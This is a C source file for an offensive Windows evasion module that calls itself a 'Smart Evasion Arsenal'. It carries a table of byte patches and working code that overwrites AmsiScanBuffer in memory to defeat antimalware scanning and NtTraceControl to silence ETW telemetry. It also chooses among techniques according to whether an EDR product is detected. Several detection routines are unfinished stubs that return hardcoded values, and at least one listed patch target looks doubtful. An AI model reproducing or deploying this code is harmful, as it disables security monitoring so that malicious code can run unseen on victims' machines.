#include "../include/intelligent_bypass.h"
#include "../include/cynical_logger.h"
#include "../include/syscalls.h"
#include "../include/utils.h"
#include "../include/mem.h"
#include <stdarg.h>

// ========================================================================
// INTELLIGENT BYPASS v1.0 IMPLEMENTATION - "Smart Evasion Arsenal"
// ========================================================================

// Global bypass context
BYPASS_CONTEXT g_bypass_ctx = { 0 };

// ========================================================================
// BYPASS TECHNIQUES DATABASE - "The Complete Arsenal"
// ========================================================================

// Predefined bypass techniques with intelligence
static BYPASS_TECHNIQUE g_bypass_techniques[] = {
    // === AMSI BYPASS TECHNIQUES ===
    {
        .method = BYPASS_AMSI_PATCH_SCAN_BUFFER,
        .type = BYPASS_TYPE_AMSI,
        .name = "AMSI ScanBuffer Patch",
        .description = "Patch AmsiScanBuffer to always return clean result",
        .min_windows_version = 0x0A00,  // Windows 10+
        .max_windows_version = 0,       // No upper limit
        .effectiveness_score = 95,      // Very effective
        .stealth_score = 75,            // Medium stealth
        .reliability_score = 90,        // Very reliable
        .requires_elevation = FALSE,
        .requires_debug_privilege = FALSE,
        .requires_wow64 = FALSE,
        .works_with_defender = TRUE,
        .works_with_edr = TRUE,
        .target_function = "AmsiScanBuffer",
        .patch_offset = 0,
        .patch_bytes = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, // mov eax, 0x80070057; ret
        .patch_size = 6,
        .pfnInitialize = NULL,
        .pfnExecute = NULL,
        .pfnVerify = NULL,
        .pfnCleanup = NULL
    },
    {
        .method = BYPASS_AMSI_PATCH_UTILS,
        .type = BYPASS_TYPE_AMSI,
        .name = "AMSI Utils Patch",
        .description = "Patch amsi.dll!AmsiUtils function",
        .min_windows_version = 0x0A00,
        .max_windows_version = 0,
        .effectiveness_score = 90,
        .stealth_score = 80,
        .reliability_score = 85,
        .requires_elevation = FALSE,
        .requires_debug_privilege = FALSE,
        .requires_wow64 = FALSE,
        .works_with_defender = TRUE,
        .works_with_edr = TRUE,
        .target_function = "AmsiUtils",
        .patch_offset = 0,
        .patch_bytes = { 0x48, 0x31, 0xC0, 0xC3 }, // xor rax, rax; ret
        .patch_size = 4,
        .pfnInitialize = NULL,
        .pfnExecute = NULL,
        .pfnVerify = NULL,
        .pfnCleanup = NULL
    },
    
    // === ETW BYPASS TECHNIQUES ===
    {
        .method = BYPASS_ETW_PATCH_TRACE_CONTROL,
        .type = BYPASS_TYPE_ETW,
        .name = "ETW TraceControl Patch",
        .description = "Patch NtTraceControl to disable ETW tracing",
        .min_windows_version = 0x0601,  // Windows 7+
        .max_windows_version = 0,
        .effectiveness_score = 85,
        .stealth_score = 70,
        .reliability_score = 80,
        .requires_elevation = FALSE,
        .requires_debug_privilege = FALSE,
        .requires_wow64 = FALSE,
        .works_with_defender = TRUE,
        .works_with_edr = FALSE,        // EDRs monitor this
        .target_function = "NtTraceControl",
        .patch_offset = 0,
        .patch_bytes = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }, // mov eax, 0; ret
        .patch_size = 6,
        .pfnInitialize = NULL,
        .pfnExecute = NULL,
        .pfnVerify = NULL,
        .pfnCleanup = NULL
    },
    {
        .method = BYPASS_ETW_PATCH_CREATE_EVENT,
        .type = BYPASS_TYPE_ETW,
        .name = "ETW CreateEvent Patch",
        .description = "Patch EtwpCreateEtwEvent to prevent event creation",
        .min_windows_version = 0x0602,  // Windows 8+
        .max_windows_version = 0,
        .effectiveness_score = 80,
        .stealth_score = 85,
        .reliability_score = 75,
        .requires_elevation = FALSE,
        .requires_debug_privilege = FALSE,
        .requires_wow64 = FALSE,
        .works_with_defender = TRUE,
        .works_with_edr = TRUE,
        .target_function = "EtwpCreateEtwEvent",
        .patch_offset = 0,
        .patch_bytes = { 0x48, 0x31, 0xC0, 0xC3 }, // xor rax, rax; ret
        .patch_size = 4,
        .pfnInitialize = NULL,
        .pfnExecute = NULL,
        .pfnVerify = NULL,
        .pfnCleanup = NULL
    },
    
    // === COMBINED TECHNIQUES ===
    {
        .method = BYPASS_HEAVEN_GATE_TRANSITION,
        .type = BYPASS_TYPE_COMBINED,
        .name = "Heaven's Gate Transition",
        .description = "Use WoW64 transition to bypass x64 hooks",
        .min_windows_version = 0x0601,
        .max_windows_version = 0,
        .effectiveness_score = 98,      // Extremely effective
        .stealth_score = 95,            // Very stealthy
        .reliability_score = 85,        // Good reliability
        .requires_elevation = FALSE,
        .requires_debug_privilege = FALSE,
        .requires_wow64 = TRUE,         // WoW64 required
        .works_with_defender = TRUE,
        .works_with_edr = TRUE,
        .target_function = NULL,        // No specific target
        .patch_offset = 0,
        .patch_size = 0,
        .pfnInitialize = NULL,
        .pfnExecute = NULL,
        .pfnVerify = NULL,
        .pfnCleanup = NULL
    },
    
    // === HARDWARE TECHNIQUES ===
    {
        .method = BYPASS_HARDWARE_BREAKPOINT,
        .type = BYPASS_TYPE_HARDWARE,
        .name = "Hardware Breakpoint Evasion",
        .description = "Use hardware breakpoints to evade software hooks",
        .min_windows_version = 0x0601,
        .max_windows_version = 0,
        .effectiveness_score = 92,
        .stealth_score = 88,
        .reliability_score = 70,        // Hardware dependent
        .requires_elevation = TRUE,     // Usually needs admin
        .requires_debug_privilege = TRUE,
        .requires_wow64 = FALSE,
        .works_with_defender = TRUE,
        .works_with_edr = TRUE,
        .target_function = NULL,
        .patch_offset = 0,
        .patch_size = 0,
        .pfnInitialize = NULL,
        .pfnExecute = NULL,
        .pfnVerify = NULL,
        .pfnCleanup = NULL
    }
};

#define BYPASS_TECHNIQUE_COUNT (sizeof(g_bypass_techniques) / sizeof(BYPASS_TECHNIQUE))

// ========================================================================
// NO-CRT UTILITY FUNCTIONS
// ========================================================================

// No-CRT wide string compare
static int bypass_wcsicmp(const WCHAR* str1, const WCHAR* str2) {
    if (!str1 || !str2) return -1;
    
    while (*str1 && *str2) {
        WCHAR c1 = (*str1 >= L'A' && *str1 <= L'Z') ? (*str1 + 32) : *str1;
        WCHAR c2 = (*str2 >= L'A' && *str2 <= L'Z') ? (*str2 + 32) : *str2;
        
        if (c1 != c2) return (c1 < c2) ? -1 : 1;
        str1++;
        str2++;
    }
    
    return (*str1 == *str2) ? 0 : ((*str1 < *str2) ? -1 : 1);
}

// No-CRT string compare
static int bypass_stricmp(const char* str1, const char* str2) {
    if (!str1 || !str2) return -1;
    
    while (*str1 && *str2) {
        char c1 = (*str1 >= 'A' && *str1 <= 'Z') ? (*str1 + 32) : *str1;
        char c2 = (*str2 >= 'A' && *str2 <= 'Z') ? (*str2 + 32) : *str2;
        
        if (c1 != c2) return (c1 < c2) ? -1 : 1;
        str1++;
        str2++;
    }
    
    return (*str1 == *str2) ? 0 : ((*str1 < *str2) ? -1 : 1);
}

// ========================================================================
// ENVIRONMENT ANALYSIS IMPLEMENTATION
// ========================================================================

BOOL IntelligentBypass_DetectWindowsVersion(PWINDOWS_VERSION_INFO version_info) {
    if (!version_info) return FALSE;
    
    CynicalLog_Debug("BYPASS", "Detecting Windows version and security features");
    
    memset(version_info, 0, sizeof(WINDOWS_VERSION_INFO));
    
    // TODO: Implement proper version detection
    // For now, assume Windows 10 with modern features
    version_info->major_version = 10;
    version_info->minor_version = 0;
    version_info->build_number = 19041;  // 20H1
    version_info->is_server = FALSE;
    version_info->has_defender = TRUE;
    version_info->has_wdac = FALSE;
    version_info->has_hvci = FALSE;
    version_info->has_cet = FALSE;
    version_info->has_cfg = TRUE;
    
    CynicalLog_Info("BYPASS", "Windows version: %d.%d.%d", 
                   version_info->major_version, 
                   version_info->minor_version, 
                   version_info->build_number);
    
    return TRUE;
}

BOOL IntelligentBypass_DetectDefender(VOID) {
    CynicalLog_Debug("BYPASS", "Detecting Windows Defender status");
    
    // TODO: Implement real Defender detection
    BOOL defender_detected = TRUE;
    
    CynicalLog_Info("BYPASS", "Windows Defender status: %s", 
                   defender_detected ? "ACTIVE" : "INACTIVE");
    
    return defender_detected;
}

BOOL IntelligentBypass_DetectEDR(PWCHAR edr_product, SIZE_T buffer_size) {
    if (!edr_product || buffer_size == 0) return FALSE;
    
    CynicalLog_Debug("BYPASS", "Scanning for EDR products");
    
    edr_product[0] = L'\0';
    
    // TODO: Implement real EDR detection
    
    CynicalLog_Info("BYPASS", "EDR scan completed: %s", 
                   edr_product[0] ? "EDR detected" : "No EDR detected");
    
    return (edr_product[0] != L'\0');
}

DWORD IntelligentBypass_AnalyzeHooks(VOID) {
    CynicalLog_Debug("BYPASS", "Analyzing hook landscape");
    
    // TODO: Implement hook detection logic
    DWORD hook_count = 3;
    
    CynicalLog_Info("BYPASS", "Hook analysis completed: %d hooks detected", hook_count);
    
    return hook_count;
}

// ========================================================================
// BYPASS TECHNIQUE SELECTION
// ========================================================================

DWORD IntelligentBypass_SelectOptimalTechniques(
    BYPASS_TECHNIQUE_TYPE desired_types,
    PBYPASS_TECHNIQUE* selected_techniques,
    DWORD max_techniques
) {
    if (!selected_techniques || max_techniques == 0) return 0;
    
    CynicalLog_Info("BYPASS", "Selecting optimal bypass techniques for type mask: 0x%X", desired_types);
    
    DWORD selected_count = 0;
    PWINDOWS_VERSION_INFO version_info = &g_bypass_ctx.windows_info;
    
    // Calculate current Windows version as comparable value
    DWORD current_version = (version_info->major_version << 8) | version_info->minor_version;
    
    for (DWORD i = 0; i < BYPASS_TECHNIQUE_COUNT && selected_count < max_techniques; i++) {
        PBYPASS_TECHNIQUE technique = &g_bypass_techniques[i];
        
        // Check if technique type matches desired types
        if (!(technique->type & desired_types)) {
            continue;
        }
        
        // Check Windows version compatibility
        if (current_version < technique->min_windows_version) {
            CynicalLog_Debug("BYPASS", "Technique %s incompatible: version too old", technique->name);
            continue;
        }
        
        // Check EDR compatibility
        if (g_bypass_ctx.edr_detected && !technique->works_with_edr) {
            CynicalLog_Debug("BYPASS", "Technique %s incompatible with EDR", technique->name);
            continue;
        }
        
        // Technique passed all checks
        selected_techniques[selected_count] = technique;
        selected_count++;
        
        CynicalLog_Info("BYPASS", "Selected technique: %s (effectiveness: %d, stealth: %d)", 
                       technique->name, technique->effectiveness_score, technique->stealth_score);
    }
    
    CynicalLog_Info("BYPASS", "Selected %d optimal bypass techniques", selected_count);
    
    return selected_count;
}

// ========================================================================
// BYPASS EXECUTION ENGINE
// ========================================================================

NTSTATUS IntelligentBypass_AMSI_PatchScanBuffer(VOID) {
    CynicalLog_Info("BYPASS", "Executing AMSI ScanBuffer patch");
    
    // Get amsi.dll base address
    PVOID amsi_base = find_module_base(L"amsi.dll");
    if (!amsi_base) {
        CynicalLog_Error("BYPASS", "Failed to find amsi.dll");
        return STATUS_NOT_FOUND;
    }
    
    // Find AmsiScanBuffer function
    PVOID scan_buffer_addr = find_function(amsi_base, "AmsiScanBuffer");
    if (!scan_buffer_addr) {
        CynicalLog_Error("BYPASS", "Failed to find AmsiScanBuffer function");
        return STATUS_NOT_FOUND;
    }
    
    // Apply patch
    BYTE patch_bytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
    BYTE original_bytes[16] = { 0 };
    
    NTSTATUS status = IntelligentBypass_ApplyPatch(
        scan_buffer_addr,
        patch_bytes,
        sizeof(patch_bytes),
        original_bytes
    );
    
    if (NT_SUCCESS(status)) {
        CynicalLog_Info("BYPASS", "AMSI ScanBuffer patch applied successfully");
        g_bypass_ctx.amsi_bypassed = TRUE;
    } else {
        CynicalLog_Error("BYPASS", "Failed to apply AMSI ScanBuffer patch: 0x%08X", status);
    }
    
    return status;
}

NTSTATUS IntelligentBypass_ETW_PatchTraceControl(VOID) {
    CynicalLog_Info("BYPASS", "Executing ETW TraceControl patch");
    
    // Get ntdll.dll base address
    PVOID ntdll_base = find_module_base(L"ntdll.dll");
    if (!ntdll_base) {
        CynicalLog_Error("BYPASS", "Failed to find ntdll.dll");
        return STATUS_NOT_FOUND;
    }
    
    // Find NtTraceControl function
    PVOID trace_control_addr = find_function(ntdll_base, "NtTraceControl");
    if (!trace_control_addr) {
        CynicalLog_Error("BYPASS", "Failed to find NtTraceControl function");
        return STATUS_NOT_FOUND;
    }
    
    // Apply patch
    BYTE patch_bytes[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
    BYTE original_bytes[16] = { 0 };
    
    NTSTATUS status = IntelligentBypass_ApplyPatch(
        trace_control_addr,
        patch_bytes,
        sizeof(patch_bytes),
        original_bytes
    );
    
    if (NT_SUCCESS(status)) {
        CynicalLog_Info("BYPASS", "ETW TraceControl patch applied successfully");
        g_bypass_ctx.etw_bypassed = TRUE;
    } else {
        CynicalLog_Error("BYPASS", "Failed to apply ETW TraceControl patch: 0x%08X", status);
    }
    
    return status;
}

NTSTATUS IntelligentBypass_ExecuteTechniques(
    PBYPASS_TECHNIQUE techniques,
    DWORD technique_count
) {
    if (!techniques || technique_count == 0) return STATUS_INVALID_PARAMETER;
    
    CynicalLog_Info("BYPASS", "Executing %d bypass techniques", technique_count);
    
    NTSTATUS overall_status = STATUS_SUCCESS;
    DWORD successful_bypasses = 0;
    
    for (DWORD i = 0; i < technique_count; i++) {
        PBYPASS_TECHNIQUE technique = &techniques[i];
        NTSTATUS status = STATUS_NOT_IMPLEMENTED;
        
        CynicalLog_Info("BYPASS", "Executing technique: %s", technique->name);
        
        // Execute technique based on method
        switch (technique->method) {
            case BYPASS_AMSI_PATCH_SCAN_BUFFER:
                status = IntelligentBypass_AMSI_PatchScanBuffer();
                break;
                
            case BYPASS_ETW_PATCH_TRACE_CONTROL:
                status = IntelligentBypass_ETW_PatchTraceControl();
                break;
                
            default:
                CynicalLog_Warn("BYPASS", "Technique %s not yet implemented", technique->name);
                status = STATUS_NOT_IMPLEMENTED;
                break;
        }
        
        // Log result
        IntelligentBypass_LogAttempt(technique->method, status);
        
        if (NT_SUCCESS(status)) {
            successful_bypasses++;
            
            // Add to active bypasses
            if (g_bypass_ctx.active_count < 16) {
                memcpy(&g_bypass_ctx.active_bypasses[g_bypass_ctx.active_count], 
                       technique, sizeof(BYPASS_TECHNIQUE));
                g_bypass_ctx.active_count++;
            }
        } else {
            overall_status = status;
        }
        
        g_bypass_ctx.total_attempts++;
    }
    
    g_bypass_ctx.successful_bypasses += successful_bypasses;
    
    CynicalLog_Info("BYPASS", "Bypass execution completed: %d/%d successful", 
                   successful_bypasses, technique_count);
    
    return (successful_bypasses > 0) ? STATUS_SUCCESS : overall_status;
}

// ========================================================================
// UTILITY FUNCTIONS IMPLEMENTATION
// ========================================================================

NTSTATUS IntelligentBypass_ApplyPatch(
    PVOID target_address,
    PBYTE patch_bytes,
    SIZE_T patch_size,
    PBYTE original_bytes
) {
    if (!target_address || !patch_bytes || !original_bytes || patch_size == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // Save original bytes
    memcpy(original_bytes, target_address, patch_size);
    
    // Change memory protection to allow writing
    PVOID base_address = target_address;
    SIZE_T region_size = patch_size;
    ULONG old_protect = 0;
    
    NTSTATUS status = wrapped_NtProtectVirtualMemory(
        NtCurrentProcess(),
        &base_address,
        &region_size,
        PAGE_EXECUTE_READWRITE,
        &old_protect
    );
    
    if (!NT_SUCCESS(status)) {
        CynicalLog_Error("BYPASS", "Failed to change memory protection: 0x%08X", status);
        return status;
    }
    
    // Apply patch
    memcpy(target_address, patch_bytes, patch_size);
    
    // Restore original protection
    status = wrapped_NtProtectVirtualMemory(
        NtCurrentProcess(),
        &base_address,
        &region_size,
        old_protect,
        &old_protect
    );
    
    if (!NT_SUCCESS(status)) {
        CynicalLog_Warn("BYPASS", "Failed to restore memory protection: 0x%08X", status);
    }
    
    return STATUS_SUCCESS;
}

// ========================================================================
// PUBLIC API IMPLEMENTATION
// ========================================================================

BOOL IntelligentBypass_Initialize(VOID) {
    CynicalLog_Info("BYPASS", "Initializing Intelligent Bypass v1.0");
    
    memset(&g_bypass_ctx, 0, sizeof(BYPASS_CONTEXT));
    
    // Detect Windows version and features
    if (!IntelligentBypass_DetectWindowsVersion(&g_bypass_ctx.windows_info)) {
        CynicalLog_Error("BYPASS", "Failed to detect Windows version");
        return FALSE;
    }
    
    // Detect security products
    g_bypass_ctx.defender_active = IntelligentBypass_DetectDefender();
    g_bypass_ctx.edr_detected = IntelligentBypass_DetectEDR(
        g_bypass_ctx.edr_product, 
        sizeof(g_bypass_ctx.edr_product)
    );
    
    // Analyze hook landscape
    g_bypass_ctx.hook_count = IntelligentBypass_AnalyzeHooks();
    
    // Initialize statistics
    wrapped_NtQueryPerformanceCounter(&g_bypass_ctx.start_time, NULL);
    g_bypass_ctx.is_initialized = TRUE;
    
    CynicalLog_Info("BYPASS", "Intelligent Bypass initialized successfully");
    IntelligentBypass_LogEnvironmentAnalysis(&g_bypass_ctx.windows_info);
    
    return TRUE;
}

VOID IntelligentBypass_Cleanup(VOID) {
    CynicalLog_Info("BYPASS", "Cleaning up Intelligent Bypass");
    
    // Generate final report
    IntelligentBypass_GenerateReport();
    
    // Clear context
    memset(&g_bypass_ctx, 0, sizeof(BYPASS_CONTEXT));
}

// ========================================================================
// LOGGING FUNCTIONS
// ========================================================================

VOID IntelligentBypass_LogAttempt(BYPASS_METHOD method, NTSTATUS result) {
    if (NT_SUCCESS(result)) {
        CynicalLog_Info("BYPASS", "Bypass method %d executed successfully", method);
    } else {
        CynicalLog_Error("BYPASS", "Bypass method %d failed with status 0x%08X", method, result);
    }
}

VOID IntelligentBypass_LogEnvironmentAnalysis(PWINDOWS_VERSION_INFO version_info) {
    if (!version_info) return;
    
    CynicalLog_Info("BYPASS", "=== BYPASS ENVIRONMENT ANALYSIS ===");
    CynicalLog_Info("BYPASS", "Windows: %d.%d.%d", 
                   version_info->major_version, version_info->minor_version, version_info->build_number);
    CynicalLog_Info("BYPASS", "Defender: %s", version_info->has_defender ? "YES" : "NO");
    CynicalLog_Info("BYPASS", "CFG: %s", version_info->has_cfg ? "YES" : "NO");
    CynicalLog_Info("BYPASS", "HVCI: %s", version_info->has_hvci ? "YES" : "NO");
    CynicalLog_Info("BYPASS", "CET: %s", version_info->has_cet ? "YES" : "NO");
    CynicalLog_Info("BYPASS", "Hooks detected: %d", g_bypass_ctx.hook_count);
    CynicalLog_Info("BYPASS", "=== END ANALYSIS ===");
}

VOID IntelligentBypass_GenerateReport(VOID) {
    CynicalLog_Info("BYPASS", "=== INTELLIGENT BYPASS FINAL REPORT ===");
    CynicalLog_Info("BYPASS", "Total attempts: %d", g_bypass_ctx.total_attempts);
    CynicalLog_Info("BYPASS", "Successful bypasses: %d", g_bypass_ctx.successful_bypasses);
    CynicalLog_Info("BYPASS", "Failed attempts: %d", g_bypass_ctx.failed_attempts);
    CynicalLog_Info("BYPASS", "AMSI bypassed: %s", g_bypass_ctx.amsi_bypassed ? "YES" : "NO");
    CynicalLog_Info("BYPASS", "ETW bypassed: %s", g_bypass_ctx.etw_bypassed ? "YES" : "NO");
    CynicalLog_Info("BYPASS", "Active bypasses: %d", g_bypass_ctx.active_count);
    CynicalLog_Info("BYPASS", "=== END REPORT ===");
} 